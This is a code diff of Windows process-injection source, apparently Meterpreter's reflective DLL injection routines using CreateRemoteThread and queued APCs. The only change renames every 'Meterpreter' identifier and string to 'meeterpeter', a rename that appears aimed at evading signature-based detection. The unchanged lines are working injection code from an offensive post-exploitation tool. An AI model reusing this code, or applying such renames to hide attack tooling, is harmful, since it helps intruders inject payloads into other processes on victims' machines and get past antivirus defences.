@@ -4,11 +4,11 @@
 #include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
 #include <Tlhelp32.h>
 
-// Simple trick to get the current meterpreters arch
+// Simple trick to get the current meeterpeters arch
 #ifdef _WIN64
-	DWORD dwMeterpreterArch = PROCESS_ARCH_X64;
+	DWORD dwmeeterpeterArch = PROCESS_ARCH_X64;
 #else
-	DWORD dwMeterpreterArch = PROCESS_ARCH_X86;
+	DWORD dwmeeterpeterArch = PROCESS_ARCH_X86;
 #endif
 
 // see '/msf3/external/source/shellcode/x86/migrate/executex64.asm'
@@ -110,7 +110,7 @@ DWORD inject_via_apcthread( HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinat
 		// Get the architecture specific apc migration stub...
 		if( dwDestinationArch == PROCESS_ARCH_X86 )
 		{
-			if( dwMeterpreterArch == PROCESS_ARCH_X64 )
+			if( dwmeeterpeterArch == PROCESS_ARCH_X64 )
 			{
 				// injecting x64->x86(wow64)
 				
@@ -135,7 +135,7 @@ DWORD inject_via_apcthread( HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinat
 			lpApcStub       = &apc_stub_x64;
 			dwApcStubLength = sizeof( apc_stub_x64 );
 
-			if( dwMeterpreterArch == PROCESS_ARCH_X86 )
+			if( dwmeeterpeterArch == PROCESS_ARCH_X86 )
 			{
 				// injecting x86(wow64)->x64
 
@@ -235,7 +235,7 @@ DWORD inject_via_apcthread( HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinat
 		// Simply determine the apc context address
 		lpRemoteApcContext = ( (BYTE *)lpRemoteApcStub + dwApcStubLength );
 
-		dprintf( "[INJECT] -- dwMeterpreterArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X", ( dwMeterpreterArch == 2 ? "x64" : "x86" ), lpRemoteApcStub, lpRemoteApcContext );
+		dprintf( "[INJECT] -- dwmeeterpeterArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X", ( dwmeeterpeterArch == 2 ? "x64" : "x86" ), lpRemoteApcStub, lpRemoteApcContext );
 
 		// Write the apc stub to memory...
 		if( !WriteProcessMemory( hProcess, lpRemoteApcStub, lpApcStub, dwApcStubLength, NULL ) )
@@ -418,7 +418,7 @@ DWORD inject_via_remotethread( HANDLE hProcess, DWORD dwDestinationArch, LPVOID 
 		hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, CREATE_SUSPENDED, &dwThreadId );
 		if( !hThread )
 		{
-			if( dwMeterpreterArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64 )
+			if( dwmeeterpeterArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64 )
 			{
 				// injecting x86(wow64)->x64, (we expect the call to kernel32!CreateRemoteThread to fail and bring us here).
 
@@ -515,12 +515,12 @@ DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLenght )
 		lpReflectiveLoader = (LPVOID)( (DWORD)lpRemoteLibraryBuffer + (DWORD)dwReflectiveLoaderOffset );
 	
 		// First we try to inject by directly creating a remote thread in the target process
-		if( inject_via_remotethread( hProcess, dwMeterpreterArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
+		if( inject_via_remotethread( hProcess, dwmeeterpeterArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
 		{
 			dprintf( "[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread..." );
 			
 			// If that fails we can try to migrate via a queued APC in the target process
-			if( inject_via_apcthread( hProcess, dwPid, dwMeterpreterArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
+			if( inject_via_apcthread( hProcess, dwPid, dwmeeterpeterArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
 				BREAK_ON_ERROR( "[INJECT] inject_dll. inject_via_apcthread failed" )
 		}
 
